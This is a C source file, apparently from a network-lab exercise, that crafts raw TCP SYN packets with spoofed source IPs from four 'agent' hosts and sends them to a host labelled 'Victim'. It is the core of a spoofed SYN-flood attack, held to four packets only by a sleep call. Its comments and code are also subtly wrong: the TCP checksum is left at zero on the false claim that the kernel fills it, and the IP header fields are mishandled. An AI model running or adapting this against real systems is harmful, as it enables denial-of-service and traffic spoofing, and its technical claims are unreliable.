#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdlib.h>

unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1)
        sum += *(unsigned char *)ptr;

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int main() {
    int sock;
    char packet[4096];
    struct iphdr *iph;
    struct tcphdr *tcph;
    struct sockaddr_in dest;

    // Victim
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr("10.0.0.2");

    // Four spoofed agent IPs (h3–h6)
    char *agents[] = {
        "10.0.0.3",
        "10.0.0.4",
        "10.0.0.5",
        "10.0.0.6"
    };

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Socket error");
        return 1;
    }

    for (int i = 0; i < 4; i++) {
        memset(packet, 0, sizeof(packet));

        iph = (struct iphdr *)packet;
        tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));

        // IP HEADER (user-defined)
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id = htons(1000 + i);
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = inet_addr(agents[i]);     // spoofed agent
        iph->daddr = dest.sin_addr.s_addr;
        iph->check = checksum((unsigned short *)packet, iph->tot_len);

        // TCP HEADER (SYN only)
        tcph->source = htons(4000 + i);
        tcph->dest = htons(80);
        tcph->seq = htonl(0);
        tcph->doff = 5;
        tcph->syn = 1;                          // SYN flag
        tcph->window = htons(1024);
        tcph->check = 0;                        // kernel will fill

        sendto(sock, packet, iph->tot_len, 0,
               (struct sockaddr *)&dest, sizeof(dest));

        printf("Sent controlled SYN from agent %s to victim\n", agents[i]);

        sleep(1);  // 🔐 SAFETY: no flooding
    }

    close(sock);
    printf("SYN pattern demonstration completed (no flooding).\n");
    return 0;
}
